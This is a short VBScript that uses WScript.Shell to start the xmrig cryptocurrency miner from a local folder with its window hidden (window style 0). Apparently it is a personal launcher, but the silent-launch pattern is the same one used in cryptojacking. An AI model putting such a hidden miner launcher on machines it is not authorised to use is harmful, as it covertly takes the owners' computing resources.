Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "D:\Safe\Mines\Own"
WshShell.Run "D:\Safe\Mines\Own\xmrig.exe", 0, False
